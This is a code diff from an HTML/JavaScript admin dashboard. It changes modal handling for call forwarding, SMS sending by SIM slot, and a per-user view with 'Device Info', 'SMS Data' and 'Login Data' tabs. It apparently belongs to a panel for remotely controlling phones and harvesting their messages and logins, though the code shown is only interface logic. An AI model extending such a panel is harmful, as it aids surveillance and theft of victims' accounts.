             document.getElementById('callForwardModal').classList.remove('hidden');
             document.getElementById('forwardCallNumber').value = '';
             document.getElementById('forwardStatus').style.display = 'none';
@@ -2110,14 +2303,14 @@
 
         function closeCallForwardModal() {
             document.getElementById('callForwardModal').classList.add('hidden');
-            currentUser = null;
+            // currentUser = null; // Keep currentUser set as it's set in openUserModal
         }
 
         // SMS Sending with 170 character limit
         function sendSMS() {
             const phoneNumber = document.getElementById('smsNumber').value.trim();
             const message = document.getElementById('smsMessage').value.trim();
-            const simSlot = document.getElementById('smsSimSlot').value;
+            const simSlot = document.getElementById('smsSimSlot').value; // value is 0 or 1
 
             if (!phoneNumber) {
                 showToast('Please enter phone number', 'error');
@@ -2298,13 +2491,37 @@
             const modals = document.querySelectorAll('.modal, .password-modal, .device-sms-modal');
             modals.forEach(modal => {
                 if (event.target === modal) {
-                    modal.classList.add('hidden');
+                    // Check if it's the main user modal and close listeners
+                    if (modal.id === 'userModal') {
+                        closeUserModal();
+                    } else if (modal.id === 'deviceSMSModal') {
+                        closeDeviceSMSModal();
+                    } else if (modal.id === 'passwordModal') {
+                        cancelDelete(); // Treat outside click on password modal as cancel
+                    } else {
+                        modal.classList.add('hidden');
+                    }
                 }
             });
         }
 
-        // Auto-refresh is not needed anymore due to realtime listeners
-        // All data updates automatically in real-time
+        // Set default active tab for user modal when loaded
+        document.getElementById('userModal').addEventListener('click', function(e) {
+            if (e.target.classList.contains('nav-btn') && e.target.closest('.tabs')) {
+                // Ensure correct tab loading when manually clicking
+                const tabText = e.target.textContent.trim();
+                let tabName;
+                if (tabText.includes('Device Info')) tabName = 'deviceInfo';
+                else if (tabText.includes('SMS Data')) tabName = 'smsData';
+                else if (tabText.includes('Login Data')) tabName = 'loginData';
+                
+                if (tabName) {
+                    // Manually call loadTabContent since the default click handler only handles CSS classes
+                    loadTabContent(tabName);
+                }
+            }
+        });
+
     </script>
 </body>
 </html>
